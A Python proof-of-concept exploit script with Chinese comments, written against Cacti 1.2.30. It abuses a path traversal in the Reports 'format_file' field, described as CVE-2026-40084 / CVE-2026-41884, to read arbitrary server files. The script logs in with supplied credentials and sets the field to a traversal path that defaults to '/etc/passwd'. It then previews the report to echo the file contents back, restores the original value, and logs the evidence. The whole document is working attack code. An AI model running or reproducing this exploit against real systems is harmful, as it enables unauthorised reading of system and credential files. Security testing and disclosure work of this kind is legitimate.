#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
CVE-2026-40084 / CVE-2026-41884 — Cacti Reports `format_file` 路径穿越 → 任意文件读

目标: Cacti 1.2.30（影响 <= 1.2.30，修复 1.2.31）

原理（源码闭环，均对照 Cacti release/1.2.30 逐行核对）
------------------------------------------------------------------
写侧  lib/html_reports.php:277
      $save['format_file'] = get_nfilter_request_var('format_file');      # 唯一不做 form_input_validate 的字段
读侧  lib/reports.php:631-643
      $format_file = $config['base_path'] . '/formats/' . $format_file;   # 无规范化 / 无白名单
      if (file_exists($format_file) && is_readable($format_file)) { $contents = file($format_file); }
      之后逐行：if (substr($line,0,1) != '#') { $output .= $line . PHP_EOL; }  # 文件内容原样进入报告输出
渲染  lib/html_reports.php:1586 (preview 标签页)
      print reports_generate_html($report['id'], REPORTS_OUTPUT_STDOUT);

=> 把 `format_file` 设为 `../../../../../../etc/passwd`，预览该报告即可在响应中原样读回文件内容。

认证边界：**需要已登录且拥有 Reports 权限的会话**（不是 pre-auth）。
副作用：仅修改一条报告记录的 format_file，脚本会在结束时**自动还原原值**。

目标与凭据完全参数化（源码内不写死任何 IP / 端口 / 口令）：
    --host / --port / --base / --user / --password / --report-id / --file
    CACTI_HOST / CACTI_PORT / CACTI_BASE / CACTI_USER / CACTI_PASSWORD
    缺 host / port / user / password 时直接报错退出，不会默认打任何机器。

用法:
    python3 poc_cve_2026_40084_file_read.py --host <IP> --port 80 --user <U> --password <P>
    CACTI_HOST=<IP> CACTI_PORT=80 CACTI_USER=<U> CACTI_PASSWORD=<P> python3 poc_cve_2026_40084_file_read.py
"""

import argparse
import datetime
import http.client
import os
import re
import sys
import urllib.parse

ENV = {"host": "CACTI_HOST", "port": "CACTI_PORT", "base": "CACTI_BASE",
       "user": "CACTI_USER", "password": "CACTI_PASSWORD"}

DEFAULT_FILE = "../../../../../../etc/passwd"     # 相对 <base_path>/formats/ 的穿越
MARKER = "reports_admin_edit"                     # 预览输出表格锚点
_log = None


def log(line=""):
    print(line)
    if _log is not None:
        _log.write(line + "\n")
        _log.flush()


class Cacti(object):
    def __init__(self, host, port, base, timeout=20):
        self.host, self.port, self.base, self.timeout = host, port, base, timeout
        self.cj = {}

    def req(self, path, method="GET", data=None, hdrs=None):
        h = {"User-Agent": "poc-cve-2026-40084", "Accept": "*/*"}
        if self.cj:
            h["Cookie"] = "; ".join("%s=%s" % kv for kv in self.cj.items())
        if hdrs:
            h.update(hdrs)
        body = None
        if data is not None:
            body = urllib.parse.urlencode(data, doseq=True)
            h["Content-Type"] = "application/x-www-form-urlencoded"
        # 支持 --host 带 https:// 前缀的情况；否则按 --https 处理
        conn = (http.client.HTTPSConnection(self.host, self.port, timeout=self.timeout, context=_sslctx())
                if getattr(self, "https", False) else
                http.client.HTTPConnection(self.host, self.port, timeout=self.timeout))
        try:
            conn.request(method, path, body=body, headers=h)
            r = conn.getresponse()
            buf = r.read(2_000_000).decode("utf-8", "replace")
            for k, v in r.getheaders():
                if k.lower() == "set-cookie":
                    self.cj[v.split("=", 1)[0].strip()] = v.split("=", 1)[1].split(";")[0]
            return r.status, buf, (r.getheader("Location") or "")
        finally:
            conn.close()

    @staticmethod
    def csrf(html):
        m = re.search(r"name=['\"]__csrf_magic['\"]\s+value=['\"]([^'\"]+)", html)
        return m.group(1) if m else None

    def login(self, user, password):
        st, b, _ = self.req(self.base + "/index.php")
        tok = self.csrf(b)
        if not tok:
            return False, "登录页未取到 __csrf_magic"
        st, b, loc = self.req(self.base + "/index.php", "POST",
                              {"__csrf_magic": tok, "action": "login",
                               "login_username": user, "login_password": password})
        st2, b2, _ = self.req(self.base + "/index.php")
        t = re.search(r"(?is)<title[^>]*>(.*?)</title>", b2)
        title = t.group(1).strip() if t else "-"
        return ("Login" not in title), title


def _sslctx():
    import ssl
    return ssl._create_unverified_context()


def parse_form(html):
    """把页面表单里 input/select/textarea 的当前值全部抓出来，便于原样回写。"""
    f = {}
    for m in re.finditer(r"<input[^>]*name=['\"]([^'\"]+)['\"][^>]*>", html):
        tag, n = m.group(0), m.group(1)
        v = re.search(r"value=['\"]([^'\"]*)['\"]", tag)
        f[n] = v.group(1) if v else ""
        if "checked" in tag:
            f[n + "__checked"] = True
    for m in re.finditer(r"<select[^>]*name=['\"]([^'\"]+)['\"](.*?)</select>", html, re.S):
        n = m.group(1)
        for o in re.finditer(r"<option value=['\"]([^'\"]*)['\"]([^>]*)>", m.group(2)):
            if "selected" in o.group(2):
                f[n] = o.group(1)
    for m in re.finditer(r"<textarea[^>]*name=['\"]([^'\"]+)['\"][^>]*>(.*?)</textarea>", html, re.S):
        f[m.group(1)] = m.group(2)
    return f


def preview_content(html):
    """抽取预览标签页里被渲染出来的文件内容。"""
    m = re.search(r"reports_admin_edit\d+_child[^>]*>\s*<tr><td>(.*?)</td></tr>", html, re.S)
    return re.sub(r"\s+", " ", m.group(1)).strip() if m else None


def main():
    global _log
    ap = argparse.ArgumentParser(description="CVE-2026-40084 / CVE-2026-41884 Cacti Reports 任意文件读 PoC")
    for k, h in (("host", "目标 IP/FQDN"), ("port", "目标端口"), ("base", "Cacti 子路径，默认 /cacti"),
                 ("user", "Cacti 用户名"), ("password", "Cacti 口令")):
        ap.add_argument("--" + k, default=None, help="%s（或环境变量 %s）" % (h, ENV[k]))
    ap.add_argument("--https", action="store_true", help="目标为 HTTPS")
    ap.add_argument("--report-id", default=None, help="使用指定报告 id（默认自动挑一个当前用户可编辑的报告）")
    ap.add_argument("--file", default=DEFAULT_FILE, help="要读取的穿越路径，默认 %s" % DEFAULT_FILE)
    ap.add_argument("--timeout", type=float, default=20)
    ap.add_argument("--evidence-dir",
                    default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence"))
    args = ap.parse_args()

    host = args.host or os.environ.get(ENV["host"])
    port = args.port or os.environ.get(ENV["port"])
    base = args.base or os.environ.get(ENV["base"]) or "/cacti"
    user = args.user or os.environ.get(ENV["user"])
    password = args.password or os.environ.get(ENV["password"])
    for name, val in (("host", host), ("port", port), ("user", user), ("password", password)):
        if not val:
            ap.error("缺少 %s：请用 --%s，或设置环境变量 %s" % (name, name, ENV[name]))
    try:
        port = int(port)
    except (TypeError, ValueError):
        ap.error("端口必须是整数：%r" % (port,))

    os.makedirs(args.evidence_dir, exist_ok=True)
    ev = os.path.join(args.evidence_dir, "cve-2026-40084.txt")
    _log = open(ev, "w", encoding="utf-8")
    hr = "-" * 78

    log("### CVE-2026-40084 / CVE-2026-41884 — Cacti Reports `format_file` 路径穿越 → 任意文件读")
    log("### 目标: http%s://%s:%d%s      时间: %s" % ("s" if args.https else "", host, port, base,
                                                    datetime.datetime.now().strftime("%F %T")))
    log("### 认证边界：需已登录且具 Reports 权限（非 pre-auth）；本脚本结束时会还原 format_file")
    log(hr)

    c = Cacti(host, port, base, args.timeout)
    c.https = args.https
    ok, info = c.login(user, password)
    log("[0] 登录: %s  (页面 title=%s)" % ("成功" if ok else "失败", info))
    if not ok:
        log("    ❌ 登录失败，终止（本 CVE 需要认证会话）")
        _log.close()
        return 2
    log(hr)

    # 选报告
    rid = args.report_id
    if not rid:
        st, b, _ = c.req(base + "/reports_admin.php")
        ids = re.findall(r"reports_admin\.php\?action=edit&amp;tab=details&amp;id=(\d+)", b)
        if not ids:
            ids = re.findall(r"action=edit&amp;tab=details&amp;id=(\d+)", b)
        if not ids:
            log("    ❌ 当前用户没有可编辑的报告；如有权限可用 --report-id 指定")
            _log.close()
            return 3
        rid = ids[-1]
    detail = "%s/reports_admin.php?action=edit&tab=details&id=%s" % (base, rid)
    preview = "%s/reports_admin.php?action=edit&tab=preview&id=%s" % (base, rid)
    log("[1] 使用报告 id=%s" % rid)

    def grab():
        _s, h, _l = c.req(detail)
        return parse_form(h)

    def save(f, fmt):
        d = {"__csrf_magic": f["__csrf_magic"], "action": "save", "save_component_report": "1", "id": rid,
             "name": f["name"], "subject": f["subject"], "email": f["email"], "bcc": f.get("bcc", ""),
             "from_name": f["from_name"], "from_email": f["from_email"], "font_size": f["font_size"],
             "alignment": f["alignment"], "graph_columns": f["graph_columns"], "graph_width": f["graph_width"],
             "graph_height": f["graph_height"], "intrvl": f["intrvl"], "count": f["count"],
             "mailtime": f["mailtime"], "attachment_type": f["attachment_type"], "format_file": fmt}
        for k in ("enabled", "cformat", "graph_linked", "thumbnails"):
            if f.get(k + "__checked"):
                d[k] = "on"
        return c.req(base + "/reports_admin.php", "POST", d)

    orig = grab()
    orig_fmt = orig.get("format_file") or "default.format"
    log("    原始 format_file = %r" % orig_fmt)
    log(hr)

    log("[2] 基线：默认模板渲染")
    st, b, _ = c.req(preview)
    base_c = preview_content(b)
    log("    HTTP %s  输出: %s" % (st, (base_c or "(空)")[:110]))
    log(hr)

    log("[3] 注入穿越: format_file=%s" % args.file)
    st, b, loc = save(grab(), args.file)
    log("    POST save -> HTTP %s  %s" % (st, loc))
    st, b, _ = c.req(preview)
    got = preview_content(b) or ""
    log("    GET preview -> HTTP %s" % st)
    log("    ★ 读回内容: %s" % (got[:600] if got else "(空)"))
    log(hr)

    log("[4] 还原 format_file -> %r" % orig_fmt)
    st, b, loc = save(grab(), orig_fmt)
    back = grab().get("format_file")
    log("    POST save -> HTTP %s ；回读 format_file = %r  %s" % (st, back, "✅" if back == orig_fmt else "⚠"))
    log(hr)

    log("[5] 判定")
    if got and got != base_c:
        log("    ✅ 任意文件读【成立】：`%s` 的内容被回显在报告预览中" % args.file)
        log("       认证边界：需已登录 + Reports 权限（非 pre-auth）")
    else:
        log("    ❌ 未观察到文件内容（got=%r）" % got[:60])

    _log.close()
    print("\n(证据已写入 %s)" % ev)
    return 0


if __name__ == "__main__":
    sys.exit(main())
